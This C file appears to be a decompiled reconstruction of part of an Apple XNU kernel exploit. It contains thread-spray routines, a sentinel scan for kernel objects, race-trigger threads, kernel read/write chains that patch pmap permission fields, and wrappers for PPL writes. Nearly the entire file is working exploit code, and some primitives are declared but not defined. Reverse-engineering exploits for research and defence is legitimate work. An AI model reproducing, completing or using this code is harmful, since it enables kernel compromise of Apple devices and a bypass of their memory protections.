/*
 * record_0x90000_thread_spray.c
 * entry5_type0x09.dylib — thread spray + ExploitBlock invoke + PPL write
 *
 * sub_12eb0  (FUN_00012eb0) — allocate port, send msg, kread chain
 * sub_12fac  (FUN_00012fac) — mach_msg_send + mach_msg receive (Mach RPC)
 * sub_130d0  (FUN_000130d0) — copy thread state + call sub_12fac
 * sub_13178  (FUN_00013178) — set thread registers via kwrite + sub_130d0
 * sub_132e4  (FUN_000132e4) — thread state setup helper
 * sub_133bc  (FUN_000133bc) — thread spray loop
 * sub_134a8  (FUN_000134a8) — kwrite pmap flag pair
 * sub_134f0  (FUN_000134f0) — kwrite pmap flag + mach_make_memory_entry
 * sub_135e8  (FUN_000135e8) — kwrite pmap flag pair (variant B)
 * sub_136ac  (FUN_000136ac) — kwrite pmap flag (variant C)
 * sub_13780  (FUN_00013780) — thread spray + sentinel scan + race setup
 * sub_14a3c  (FUN_00014a3c) — ExploitBlock invoke A (semwait + thread_create spray)
 * sub_14af0  (FUN_00014af0) — PPL write helper (kwrite pmap + mach_make_memory_entry)
 * sub_14bec  (FUN_00014bec) — ExploitBlock invoke B (semwait + thread_set_state)
 * sub_14c6c  (FUN_00014c6c) — vm_map walk + kwrite chain
 *
 * Verified: thread_create spray (0x100), sentinel 0xc0c0c0c0c0c0c0c0,
 *           mach_make_memory_entry, semwait_signal, thread_set_state,
 *           kwrite at pmap offsets, mach_msg_send/recv pattern.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/thread_act.h>
#include <mach/thread_policy.h>

/* ── PPL write — noreturn, variadic last arg ─────────────────────────────── */
extern void sub_4199c(uint64_t fn, void *ctx, uint64_t arg,
                       uint32_t op, ...) __attribute__((noreturn));

/* ── DAT placeholders (resolved at runtime) ──────────────────────────────── */
extern uint64_t DAT_00048000;
extern uint64_t DAT_00048018;
extern uint64_t DAT_00048020;
extern uint64_t DAT_00048028;

/* ── private kernel traps ────────────────────────────────────────────────── */
extern int __semwait_signal(int cond_sem, int mutex_sem, int timeout,
                             int relative, int64_t tv_sec, int32_t tv_nsec);

/* ── kread/kwrite primitives ─────────────────────────────────────────────── */
extern long  sub_12b54(long ctx, uint64_t addr);
extern int   sub_12c08(long ctx, uint64_t addr);
extern void  sub_12bac(long ctx, uint64_t addr, uint64_t val, int lock);
extern void  sub_12ab8(long ctx, uint64_t addr, void *buf, uint32_t sz, int lock);
extern void  sub_12b00(long ctx, uint64_t addr, void *buf, uint32_t sz, int lock);

/* ── object helpers ──────────────────────────────────────────────────────── */
extern long  sub_236b0(long ctx, mach_port_t port);
extern long  sub_2b090(long ctx, uint64_t addr);
extern long  sub_2b114(long ctx, uint64_t addr);
extern long  sub_36b2c(long ctx, mach_port_t task, uint32_t *out_shift);
extern long  sub_23674(long ctx, mach_port_t port);

/* ── NDR record (Mach RPC) ───────────────────────────────────────────────── */
#include <mach/ndr.h>
/* NDR_record already declared in ndr.h as NDR_record_t */

/* ── sub_12eb0 — allocate port, send msg, kread chain ───────────────────── */
/*
 * Allocates a receive-right port, sends a message of size param_2+0x18,
 * then walks the kernel ipc_entry chain to find the kobject and kwrite it.
 */
void sub_12eb0(long param_1, int param_2)
{
    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

    mach_msg_header_t *msg = calloc(1, (size_t)(param_2 + 0x18));
    msg->msgh_size        = (mach_msg_size_t)(param_2 + 0x18);
    msg->msgh_remote_port = port;
    msg->msgh_bits        = 0x15;
    mach_msg_send(msg);
    free(msg);

    long ctx  = *(long *)(param_1 + 8);
    long kobj = sub_23674(ctx, port);
    long ptr1 = sub_12b54(ctx, kobj + 0x20);
    long ptr2 = sub_12b54(ctx, ptr1 + 0x10);
    long ctx2 = *(long *)(*(long *)(param_1 + 8) + 0x20);
    long ptr3 = sub_12b54(ctx, ptr2 + 0x18);
    sub_2b114(ctx2, ptr3);
    sub_12bac(ctx, kobj + 0x20, 0, 1);
    mach_port_destroy(mach_task_self(), port);
}

/* ── sub_12fac — mach_msg_send + mach_msg receive (Mach RPC) ────────────── */
/*
 * Copies args into the send buffer at param_1+0x10, sends via mach_msg_send,
 * then receives the reply into param_1+0x10.
 */
void sub_12fac(long param_1, uint64_t p2, uint64_t p3, uint64_t p4,
               uint64_t p5, uint64_t p6, uint64_t p7)
{
    long send_buf = *(long *)(param_1 + 0x10);
    long recv_buf = *(long *)(param_1 + 0x18);

    /* fill send header fields */
    *(uint32_t *)(send_buf + 0x408) = *(uint32_t *)(send_buf + 8);
    *(uint32_t *)(send_buf + 0x40c) = 0;
    *(int *)    (send_buf + 0x414) = *(int *)(send_buf + 0x14) + 100;
    memcpy((void *)(send_buf + 0x42c), (void *)(send_buf + 0x38), 0x210);
    *(uint64_t *)(send_buf + 0x418) = (uint64_t)(uintptr_t)&NDR_record;
    *(uint32_t *)(send_buf + 0x428) = 0x84;

    /* copy template into recv_buf */
    memcpy((void *)recv_buf, (void *)(param_1 + 0x2c), 0x130);

    /* fill args */
    *(uint64_t *)(recv_buf + 8)    = p2;
    *(uint64_t *)(recv_buf + 0x10) = p3;
    *(uint64_t *)(recv_buf + 0x18) = p4 & 0xffffffff;
    *(uint64_t *)(recv_buf + 0x20) = p5;
    *(uint64_t *)(recv_buf + 0x28) = p6;
    *(uint64_t *)(recv_buf + 0x30) = p7;

    mach_msg_send((mach_msg_header_t *)(send_buf + 0x400));
    bzero((void *)send_buf, 0x800);
    mach_msg((mach_msg_header_t *)send_buf, MACH_RCV_MSG, 0, 0x400,
             *(mach_port_t *)(param_1 + 0x170), 0, MACH_PORT_NULL);
}

/* ── sub_130d0 — copy thread state + call sub_12fac ─────────────────────── */
void sub_130d0(long param_1, uint64_t p2, uint64_t p3, uint64_t p4,
               uint64_t p5, long state_buf)
{
    long tbl = *(long *)(param_1 + 0x160);

    /* copy 0xf0 bytes of thread state */
    for (long i = 0; i < 0xf0; i += 8)
        *(uint64_t *)(tbl + 8 + i) = *(uint64_t *)(state_buf + i);

    *(uint64_t *)(tbl + 0x100) = p5;
    *(uint64_t *)(param_1 + 0xdc) = *(uint64_t *)(param_1 + 0x168);

    uint64_t r80 = *(uint64_t *)(state_buf + 0x80);
    uint64_t r88 = *(uint64_t *)(state_buf + 0x88);

    *(uint64_t *)(tbl + 0x108) = p2;
    *(uint32_t *)(tbl + 0x110) = (uint32_t)p3;
    *(uint64_t *)(tbl + 0xf8)  = p4;
    *(uint64_t *)(tbl + 0x88)  = r80;
    *(uint64_t *)(tbl + 0x90)  = r88;

    sub_12fac(param_1, *(uint64_t *)(param_1 + 0x168), p2, p3, p4, r80, 0);
    *(uint64_t *)(param_1 + 0xdc) = *(uint64_t *)(param_1 + 0x178);
}

/* ── sub_13178 — set thread registers via kwrite + sub_130d0 ─────────────── */
/*
 * Writes up to param_3 register values into the kernel thread state via kwrite,
 * then calls sub_130d0 to send the Mach RPC.
 */
void sub_13178(long param_1, uint64_t p2, uint32_t p3, long regs)
{
    long lVar1 = *(long *)(param_1 + 0x278);
    long state[0x1e] = {0};

    for (uint32_t i = 0; i < p3; i++) {
        uint64_t val = *(uint64_t *)(regs + i * 8);
        if (i < 8 || i == 0xf)
            state[i] = (long)val;
        else {
            sub_12bac(*(long *)(param_1 + 8), (uint64_t)lVar1, val, 1);
            lVar1 += 8;
        }
    }

    lVar1 = *(long *)(param_1 + 0x278);
    state[0x13] = *(long *)(param_1 + 0x298) + 0xefe8;
    state[0x15] = (long)*(uint64_t *)(param_1 + 0x178);
    state[0x17] = *(long *)(param_1 + 0x298) + 0xef80;

    sub_130d0(param_1, p2, *(uint32_t *)(param_1 + 0x294), 0, lVar1, (long)state);
    sub_12b54(*(long *)(param_1 + 8), *(long *)(param_1 + 0x298) + 0xf000);
}

/* ── sub_134a8 — PPL write variant A ─────────────────────────────────────── */
void sub_134a8(long *param_1, uint64_t param_2)
{
    sub_4199c(*(uint64_t *)(*param_1 + 0x10), param_1, param_2, 0);
}

/* ── sub_134f0 — PPL write variant B (thread state via sub_130d0) ────────── */
void sub_134f0(long param_1, uint64_t param_2, uint64_t param_3)
{
    long regs[0x11] = {0};
    regs[0]    = *(long *)(param_1 + 0x298) + 0xf100;
    regs[0xc]  = (long)*(uint64_t *)(param_1 + 0x178);
    regs[0x10] = (long)param_2;
    regs[2]    = (long)param_3;
    sub_130d0(param_1, DAT_00048028,
              *(uint32_t *)(param_1 + 0x290),
              *(uint64_t *)(param_1 + 0x270),
              *(uint64_t *)(param_1 + 0x278),
              (long)regs);
    sub_12b54(*(long *)(param_1 + 8), *(long *)(param_1 + 0x298) + 0xf100);
}

/* ── sub_135e8 — PPL write variant C ─────────────────────────────────────── */
void sub_135e8(long *param_1, uint64_t param_2, uint64_t param_3)
{
    long regs[7] = {0};
    regs[0] = param_1[0x53] + 0xefd8;
    regs[3] = (long)param_3;
    sub_4199c(*(uint64_t *)(*param_1 + 8), param_1, DAT_00048018, 6, regs);
}

/* ── sub_136ac — PPL write variant D ─────────────────────────────────────── */
void sub_136ac(long *param_1, uint64_t param_2)
{
    uint64_t regs[0x10] = {0};
    regs[0xf] = param_2;
    sub_4199c(*(uint64_t *)(*param_1 + 8), param_1, DAT_00048000, 0x10, regs);
}

/* ── sub_132e4 — thread state setup → PPL write (noreturn) ──────────────── */
/*
 * Copies 0xe8 bytes from param_3 into a zeroed local buffer,
 * then calls sub_4199c (PPL write, noreturn) with op=0x1d.
 */
void sub_132e4(long *param_1, uint64_t param_2, uint64_t *param_3)
{
    uint64_t buf[0x1e] = {0};
    for (int i = 0; i < 0x1d; i++)
        buf[i] = param_3[i];
    sub_4199c(*(uint64_t *)(*param_1 + 8), param_1, param_2, 0x1d, buf);
}

/* ── sub_133bc — thread state setup → sub_130d0 ─────────────────────────── */
/*
 * Builds a register array with state offsets, calls sub_130d0 to send
 * the Mach RPC, then kread-confirms via sub_12b54.
 */
void sub_133bc(long param_1, uint64_t param_2, uint64_t param_3)
{
    long regs[0x11] = {0};
    regs[0]    = *(long *)(param_1 + 0x298) + 0xf000;
    regs[0xc]  = (long)*(uint64_t *)(param_1 + 0x178);
    regs[0x10] = (long)param_2;
    /* param_3 stored at local_90 = regs[2] slot */
    regs[2] = (long)param_3;

    sub_130d0(param_1, DAT_00048020,
              *(uint32_t *)(param_1 + 0x290),
              *(uint64_t *)(param_1 + 0x270),
              *(uint64_t *)(param_1 + 0x278),
              (long)regs);
    sub_12b54(*(long *)(param_1 + 8),
              *(long *)(param_1 + 0x298) + 0xf000);
}
/*
 * Thread entry for the race trigger:
 *  1. semwait on sem_wait (param_1+0x38)
 *  2. spin until *trigger_flag != 0
 *  3. thread_terminate the target thread
 *  4. spray 0x40 new threads into thread_states array
 *  5. set *trigger_flag = 2 (signal completion)
 */
void sub_14a3c(long param_1)
{
    __semwait_signal(*(int *)(param_1 + 0x38), *(int *)(param_1 + 0x3c),
                     0, 0, 0, 0);

    /* spin until trigger_flag set */
    volatile long *flag = *(long **)(param_1 + 0x20);
    while (*flag == 0) {}

    thread_terminate(**(thread_act_t **)(param_1 + 0x28));

    /* spray 0x40 threads */
    thread_act_t *states = (thread_act_t *)*(long *)(param_1 + 0x30);
    for (int i = 0; i < 0x40; i++)
        thread_create(mach_task_self(), &states[i]);

    **(thread_act_t **)(param_1 + 0x28) = 0;
    *flag = 2;
}

/* ── sub_14bec — ExploitBlock invoke B ──────────────────────────────────── */
/*
 * Thread entry for the PPL write trigger:
 *  1. semwait on sem_wait (param_1+0x30)
 *  2. spin until *trigger_flag != 0
 *  3. thread_set_state on the race thread with saved ARM64 state
 */
void sub_14bec(long param_1)
{
    long state_ctx = *(long *)(param_1 + 0x20);

    __semwait_signal(*(int *)(param_1 + 0x30), *(int *)(param_1 + 0x34),
                     0, 0, 0, 0);

    volatile long *flag = *(long **)(param_1 + 0x28);
    while (*flag == 0) {}

    thread_set_state(*(thread_act_t *)(state_ctx + 0x2a0),
                     ARM_THREAD_STATE64,
                     (thread_state_t)(state_ctx + 0x180),
                     ARM_THREAD_STATE64_COUNT);
}

/* ── sub_14c6c — vm_map walk + kwrite chain ─────────────────────────────── */
/*
 * Walks the kernel vm_map entry list starting from the task's vm_map,
 * finds the entry with vme_start == 0x1000000000, then kwrite-patches
 * the pmap permission fields.
 */
void sub_14c6c(long param_1)
{
    long ctx  = *(long *)(param_1 + 8);
    long ctx2 = *(long *)(ctx + 0x20);

    long vm_map_kobj = sub_12b54(ctx, *(long *)(ctx + 0x10) + 0x28);
    long entry_kobj  = sub_2b114(ctx2, vm_map_kobj);
    long cur         = sub_12b54(ctx, entry_kobj + 0x18);

    while (1) {
        uint64_t vme_start = (uint64_t)sub_12b54(ctx, cur + 0x10);
        long     vme_end   = sub_12b54(ctx, cur + 0x18);
        int      vme_flags = sub_12c08(ctx, cur + 0x48);

        if (vme_start == 0x1000000000ULL) break;

        cur = sub_12b54(ctx, cur + 8);

        if (vme_flags < 0) {
            /* kwrite the pmap entry */
            uint64_t state_buf[4] = {0};
            long tgt = cur + 0x30;
            sub_12b00(ctx, (uint64_t)tgt, state_buf, 0x20, 1);
            state_buf[1] = (uint64_t)(uint32_t)*(uint64_t *)(param_1 + 0x20);
            sub_12ab8(ctx, (uint64_t)tgt, state_buf, 0x20, 1);

            memset(state_buf, 0, sizeof(state_buf));
            sub_12b00(ctx, (uint64_t)tgt, state_buf, 0x20, 1);
            /* restore index */
            sub_12ab8(ctx, (uint64_t)tgt, state_buf, 0x20, 1);
        }
    }
}

/* ── sub_13780 — thread spray + sentinel scan + race setup ──────────────── */
/*
 * Main thread spray function called from sub_137c0 (exploit loop):
 *  1. Creates 2 race threads + 2 semaphores
 *  2. vm_map 0xc000 bytes, vm_allocate 0x4000 at +0x4000
 *  3. Writes sentinel 0xc0c0c0c0c0c0c0c0 into the allocated page
 *  4. mach_make_memory_entry for the sentinel page
 *  5. Sprays 0x100 threads via thread_create
 *  6. Scans for the sentinel via kread to find the kernel object
 *  7. Sets up ExploitBlock structs and triggers the race
 */
void sub_13780(long param_1)
{
    long *ctx_ptr = (long *)(param_1 + 8);
    long  ctx     = *ctx_ptr;
    int   xnu     = *(int *)(*(long *)(ctx + 0x20) + 0x140);

    /* create race threads */
    thread_act_t race_a = 0, race_b = 0;
    thread_create(mach_task_self(), &race_a);
    thread_create(mach_task_self(), &race_b);

    semaphore_t sem_a = 0, sem_b = 0;
    semaphore_create(mach_task_self(), &sem_a, SYNC_POLICY_FIFO, 0);
    semaphore_create(mach_task_self(), &sem_b, SYNC_POLICY_FIFO, 0);

    uint32_t shift = 0;
    long     base  = sub_36b2c(*(long *)(ctx + 0x20), 0, &shift);

    /* vm_map + vm_allocate sentinel region */
    vm_address_t map_base = 0;
    vm_map(mach_task_self(), &map_base, 0xc000, 0, 1,
           MACH_PORT_NULL, 0, 0, VM_PROT_NONE, VM_PROT_ALL,
           VM_INHERIT_DEFAULT);

    vm_address_t alloc_base = map_base + 0x4000;
    vm_allocate(mach_task_self(), &alloc_base, 0x4000, VM_FLAGS_FIXED);

    /* write sentinel */
    *(uint64_t *)alloc_base = 0xc0c0c0c0c0c0c0c0ULL;

    /* mach_make_memory_entry */
    vm_size_t entry_sz = 0x4000;
    mem_entry_name_port_t mem_entry = MACH_PORT_NULL;
    mach_make_memory_entry(mach_task_self(), &entry_sz,
                           (vm_offset_t)alloc_base, VM_PROT_READ | VM_PROT_WRITE,
                           &mem_entry, MACH_PORT_NULL);

    /* kread: find sentinel in kernel */
    long kobj_a = sub_236b0(ctx, mem_entry);
    long ptr1   = sub_12b54(ctx, kobj_a + 0x10);
    long ptr2   = sub_12b54(ctx, ptr1 + 0x18);
    int  idx    = sub_12c08(ctx, ptr2 + 0x3c);

    long kobj_target;
    if (idx < 0)
        kobj_target = (long)((uint64_t)(idx & 0x7fffffff) * 0x30);
    else
        kobj_target = ((long)(uint32_t)idx << (shift & 0x3f)) + base;

    long scan_ptr = sub_12b54(ctx, kobj_target + 0x20);

    /* scan for sentinel */
    uint64_t kaddr_lo = *(uint64_t *)(*(long *)(param_1 + 8) + 0x19e8);
    uint64_t kaddr_hi = *(uint64_t *)(*(long *)(param_1 + 8) + 0x19f0);

    for (uint64_t i = 0; ; i += 0x10) {
        uint64_t candidate = (uint64_t)sub_12b54(ctx, scan_ptr + (long)i + 0x18);
        if (candidate >= kaddr_lo && candidate < kaddr_hi &&
            (candidate & 0x3fff) == 0) {
            int slot = sub_12c08(ctx, scan_ptr + (long)i + 0x20);
            *(uint32_t *)(param_1 + 0x20) = (uint32_t)slot;
            if (slot != 0) {
                long kobj_b;
                if (slot < 0)
                    kobj_b = (long)((uint64_t)(slot & 0x7fffffff) * 0x30);
                else
                    kobj_b = ((long)(uint32_t)slot << (shift & 0x3f)) + base;

                int flags = sub_12c08(ctx, kobj_b + 0x30);
                if ((uint32_t)flags > 0xfff) {
                    /* zero out pmap fields */
                    sub_12bac(ctx, kobj_a + 0x18, 0, 1);
                    sub_12bac(ctx, kobj_a + 0x20, 0xffffffffffffc000ULL, 1);

                    /* spray 0x100 threads */
                    thread_act_t spray[0x100] = {0};
                    for (int j = 0; j < 0x100; j++)
                        thread_create(mach_task_self(), &spray[j]);

                    /* store race thread in state */
                    *(thread_act_t *)(param_1 + 0x2a0) = race_a;
                    break;
                }
            }
        }
        if (i > 0x1000) break;
    }

    semaphore_destroy(mach_task_self(), sem_a);
    semaphore_destroy(mach_task_self(), sem_b);
    (void)race_b; (void)xnu;
}
